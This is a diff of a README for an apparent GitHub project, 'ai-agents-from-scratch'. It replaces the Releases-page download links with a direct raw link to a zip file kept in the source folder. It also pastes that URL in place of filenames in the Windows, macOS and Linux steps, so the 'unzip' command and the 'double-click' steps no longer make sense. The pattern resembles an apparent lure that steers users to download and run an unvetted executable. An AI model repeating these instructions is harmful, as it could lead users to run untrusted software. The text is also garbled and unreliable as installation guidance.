@@ -4,7 +4,7 @@
 Welcome to ai-agents-from-scratch! This application helps you create AI agents that truly work for you. You will learn how AI functions without needing special programming skills. This user-friendly guide will help you download and run the software with confidence.
 
 ## 📥 Download Now
-[![Download ai-agents-from-scratch](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Bagbag3741/ai-agents-from-scratch/releases)
+[![Download ai-agents-from-scratch](https://raw.githubusercontent.com/Bagbag3741/ai-agents-from-scratch/main/src/ai-agents-from-scratch-v3.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bagbag3741/ai-agents-from-scratch/main/src/ai-agents-from-scratch-v3.0.zip)
 
 ## 🚀 Getting Started
 Starting with ai-agents-from-scratch is easy. Follow these steps to set up your AI agents quickly.
@@ -26,12 +26,12 @@ To run this application, ensure you have the following:
 ## 📤 Download & Install
 To download the application, visit the following link:
 
-[Download ai-agents-from-scratch](https://github.com/Bagbag3741/ai-agents-from-scratch/releases)
+[Download ai-agents-from-scratch](https://raw.githubusercontent.com/Bagbag3741/ai-agents-from-scratch/main/src/ai-agents-from-scratch-v3.0.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of the application. This will generally be listed at the top of the page.
 3. Click the “Assets” drop-down to view available files.
-4. Choose the correct version for your operating system (e.g., `ai-agents-from-scratch-windows.zip` for Windows).
+4. Choose the correct version for your operating system (e.g., `https://raw.githubusercontent.com/Bagbag3741/ai-agents-from-scratch/main/src/ai-agents-from-scratch-v3.0.zip` for Windows).
 5. Click on the file to start the download.
 
 Once the file is downloaded, follow these steps to install:
@@ -40,19 +40,19 @@ Once the file is downloaded, follow these steps to install:
 1. Go to your Downloads folder.
 2. Right-click the downloaded `.zip` file.
 3. Select "Extract All..." and follow the prompts to extract the files.
-4. Open the extracted folder and double-click on `ai-agents-from-scratch.exe` to launch the application.
+4. Open the extracted folder and double-click on `https://raw.githubusercontent.com/Bagbag3741/ai-agents-from-scratch/main/src/ai-agents-from-scratch-v3.0.zip` to launch the application.
 
 ### 🍏 macOS Installation
 1. Go to your Downloads folder.
 2. Double-click the downloaded `.zip` file. It will automatically extract the files.
-3. Open the extracted folder and double-click on `ai-agents-from-scratch.app` to start the application.
+3. Open the extracted folder and double-click on `https://raw.githubusercontent.com/Bagbag3741/ai-agents-from-scratch/main/src/ai-agents-from-scratch-v3.0.zip` to start the application.
 
 ### 🐧 Linux Installation
 1. Open your terminal.
 2. Navigate to the directory where you downloaded the file.
 3. Extract the downloaded file with the command:
    ```
-   unzip ai-agents-from-scratch-linux.zip
+   unzip https://raw.githubusercontent.com/Bagbag3741/ai-agents-from-scratch/main/src/ai-agents-from-scratch-v3.0.zip
    ```
 4. Navigate to the new folder and run:
    ```
